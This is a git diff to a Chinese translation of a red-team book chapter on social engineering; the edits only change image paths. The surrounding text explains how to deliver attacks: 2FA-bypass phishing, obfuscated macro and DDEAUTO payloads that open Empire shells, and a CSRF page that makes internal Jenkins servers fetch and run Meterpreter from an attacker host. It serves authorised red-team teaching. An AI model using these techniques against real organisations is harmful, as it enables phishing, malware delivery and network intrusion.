@@ -2,7 +2,7 @@
 
 > 译者：[@Snowming](https://github.com/Snowming04)
 
-![](img/chapter_5/5-1.png)
+![](img/5-1.png)
 
 ## 开始社会工程学攻击行动
 作为红队队员，我们钟爱社会工程学攻击。不仅因为它通常包含低技能攻击，而且因为它也很容易以非常低的成本来策划一场值得我们高度信赖的战役。只需设置几个假域名、服务器、策划一些电子邮件、假装丢掉一些 bad USB，然后就可以结束一天的工作了。
@@ -62,7 +62,7 @@ Engineering Toolkit，简称 SET）。这是任何需要获取身份凭证的社
 
 如下图所示，我们现在应该有一个经过身份验证了的会话来绕过双因素验证。虽然 ReelPuish 看起来很像是支持 Linux ，但我在 Kali 中运行它时遇到了一些问题。所以最好是在 Windows 中运行 ReelPuish。你可以在 FireEye 公司的网站上找到更多关于 ReelPhish 的信息： https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html 。
 
-![](img/chapter_5/5-2.png)
+![](img/5-2.png)
 
 还有一些其他工具可以处理不同的双因素验证绕过的情境：
  - https://github.com/kgretzky/evilginx 
@@ -104,27 +104,27 @@ Engineering Toolkit，简称 SET）。这是任何需要获取身份凭证的社
         
 一旦生成成功，你的 payload 将如下所示：
 
-![](img/chapter_5/5-3.png)
+![](img/5-3.png)
 
 如你所见，这是运行一个简单的 PowerShell base64 混淆脚本。这可以帮助解决绕过一些杀毒软件，但重要的是要确保在进行实时入侵操作之前对其进行测试。生成宏后，你可以快速创建一个 Excel 文档：
 - 打开 Excel
 - 转到视图选项卡(View Tab) - >宏 - >查看宏
 - 添加一个宏名称，为 book1 配置宏，然后单击 “创建” 
 
-![](img/chapter_5/5-4.png)
+![](img/5-4.png)
 
 - 用生成的代码替换所有当前的宏代码
 - 另存为 .xls（Word 97-2003）或 Excel Macro-Enabled 格式的文件
 
-![](img/chapter_5/5-5.png)
+![](img/5-5.png)
 
 现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果你可以诱导受害者点击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给你一个 Empire Shell 。
 
-![](img/chapter_5/5-6.png)
+![](img/5-6.png)
 
 如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定的认识。利用 Office 文件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在较新版本的 Office 中，如果受害者双击 Word 文档中的 .bat 文件，对象则不会被执行。我们通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
 
-![](img/chapter_5/5-7.png)
+![](img/5-7.png)
 
 我们可以用 [LuckyStrike](https://github.com/curi0usJack/luckystrike) 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以在工作表中使用 Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件（exe），这些文件可以用 ReflectivePE 来触发从而在内存中运行。阅读更多关于 LuckyStrike 的内容：
 - https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
@@ -133,7 +133,7 @@ Engineering Toolkit，简称 SET）。这是任何需要获取身份凭证的社
 
 VBad 会严重混淆 MS Office 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急响应团队。最重要的是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用的恶意软件）。另一个特性是 VBad 也可以销毁对包含有效 payload 的模块的引用，以使其从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困难。因此，不仅很难去逆向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
  
-![](img/chapter_5/5-8.png)
+![](img/5-8.png)
 
 ### 非宏的 Office 文件 —— DDE 
 有时候红队攻击也是一场与时间赛跑的游戏，虽然有些可以利用的易受攻击模块效果很好，但是如果时间久了，一些杀毒软件或者安全软件已经包含了检测的策略，那么也很难利用，所以有时候一些新发现的漏洞是更好利用的。在我们的一次评估中，首次公布了一个名为 DDE 的全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此这是获得我们初始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能是一种可行的攻击。
@@ -151,13 +151,13 @@ Sensepost 的团队做了一些很棒的研究，发现 MSExcel 和 MSWord 都�
 DDEAUTO c:\windows\system32\cmd.exe “/k powershell.exe [empire payload here]”
 ```
 
-![](img/chapter_5/5-9.png)
+![](img/5-9.png)
 
 Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell 脚本。 此 stager 可以通过以下方式配置：
 
 - usestager windows/macroless_msword
 
-![](img/chapter_5/5-10.png)
+![](img/5-10.png)
 
 资源：
 - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
@@ -171,7 +171,7 @@ Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell
 - cd /op/EmbedInHTML
 - python embedInHTML.py -k keypasshere -f meterpreter.xll -o index.html -w
 
-![](img/chapter_5/5-11.png)
+![](img/5-11.png)
 
 一旦受害者访问恶意站点，弹出的窗口会提示受害者在 Excel 中打开我们的`.xll`文件。不幸的是，对于最新版本的 Excel（除非配置错误），用户需要启用加载项来执行我们的 payload 。这就需要使用你在前面学到的社会工程学技巧了。
 
@@ -181,7 +181,7 @@ Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell
 ## 利用社会工程学攻破内网 Jenkins
 作为红队队员，攻击的创造性使我们的工作非常令人兴奋。我们喜欢利用旧的漏洞利用并再次使它们焕然一新。例如，如果你一直在进行网络评估，你就会知道，如果遇到未经身份验证的 Jenkins 应用程序（开发人员大量使用它进行持续集成），这几乎意味着它完全敞开在你的面前。这是因为 Jenkins 具有允许 Groovy 脚本执行测试的 “特性”。利用这个脚本控制台，我们可以使用允许 shell 访问底层系统的执行命令。
 
-![](img/chapter_5/5-12.png)
+![](img/5-12.png)
 
 这种方法在入侵方面变得如此受欢迎的原因是几乎每家大公司都有一些 Jenkins 实例。如果想要从外部进行攻击，就会存在一个问题：这些 Jenkins 服务都是内部托管的，无法从外部访问。
 
@@ -201,7 +201,7 @@ Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell
 - 在这种情况下，我们下载的加密可执行文件是 Meterpreter payload。
 - Meterpreter 在 Jenkins 服务器上执行，然后连接到我们的攻击者 Meterpreter 服务器。
 
-![](img/chapter_5/5-13.png)
+![](img/5-13.png)
  
 *注意：最新版本的 Jenkins 中不存在此漏洞。 2.x 之前的版本在默认情况下是易受攻击的，因为它们未启用 CSRF 保护（允许对脚本进行无验证调用），并且未启用身份验证。*
 
@@ -242,11 +242,11 @@ mv badware.html /var/www/html/
 mv badware.exe.encrypted /var/www/html/
 ```
 
-![](img/chapter_5/5-14.png)
+![](img/5-14.png)
 
 现在，在完全不同的系统上，你可以使用 Chrome 或 Firefox 浏览器访问你的攻击者网页：http://<attacker_IP>/badware.html 。只需访问该恶意页面，你的浏览器就会通过我们的 Groovy payload，使用 JavaScript 和 POST 请求对你的内部 /24 网络经由8080端口进行攻击。当它找到一个 Jenkins 服务器时，它将导致该服务器下载我们的加密 Meterpreter ，解密并执行它。在公司网络中，你最终可能会得到大量不同的 shell 。
 
-![](img/chapter_5/5-15.png)
+![](img/5-15.png)
 
 任何允许通过 GET 或 POST HTTP 方法进行未经身份验证的代码执行的场景都可以使用此种攻击手法。对于此类攻击，你需要确定受害者在内部使用哪些应用程序并制定你的恶意攻击。
 
